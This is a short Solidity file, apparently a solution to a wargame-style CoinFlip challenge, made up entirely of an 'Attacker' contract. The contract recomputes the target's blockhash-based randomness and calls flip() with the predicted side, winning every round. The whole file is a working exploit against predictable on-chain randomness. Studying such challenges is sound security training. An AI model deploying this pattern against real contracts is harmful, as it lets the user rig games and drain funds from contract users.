// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinflip{
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract Attacker{
    uint256 constant public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinflip target;

    constructor(address _targetAddress){
        target = ICoinflip(_targetAddress);
    }

    function attacker() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }

}